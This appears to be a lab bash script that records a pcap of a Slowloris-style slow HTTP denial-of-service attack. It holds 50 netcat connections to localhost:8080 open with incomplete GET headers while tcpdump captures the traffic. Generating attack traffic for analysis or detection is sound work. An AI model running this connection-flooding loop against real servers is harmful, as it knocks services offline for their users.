#!/bin/bash
echo "Starting Slow HTTP attack capture..."
sudo tcpdump -i lo0 'port 8080' -w slowhttp_attack.pcap &
TCPDUMP_PID=$!
sleep 3
echo "Running Slow HTTP attack (keeping connections open)..."
for i in {1..50}; do
  (echo -ne "GET / HTTP/1.1\r\nHost: localhost\r\n"; sleep 10) | nc localhost 8080 &
done
sleep 15
echo "Stopping capture..."
sudo kill $TCPDUMP_PID
killall nc 2>/dev/null
sleep 2
echo "Done! Checking file..."
ls -lh slowhttp_attack.pcap
tcpdump -r slowhttp_attack.pcap | wc -l
